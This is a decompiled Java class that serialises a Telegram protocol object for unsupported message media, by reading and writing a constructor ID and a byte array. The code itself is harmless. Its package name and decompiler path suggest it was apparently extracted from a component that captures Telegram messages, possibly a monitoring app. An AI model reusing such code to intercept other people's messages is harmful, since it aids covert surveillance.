package com.vvt.capture.telegram.internal;

public class TLRPC$TL_messageMediaUnsupported_old
  extends TLRPC.TL_messageMediaUnsupported
{
  public static int constructor = 694364726;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    byte[] arrayOfByte = paramAbstractSerializedData.readByteArray(paramBoolean);
    this.bytes = arrayOfByte;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    byte[] arrayOfByte = this.bytes;
    paramAbstractSerializedData.writeByteArray(arrayOfByte);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_messageMediaUnsupported_old.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */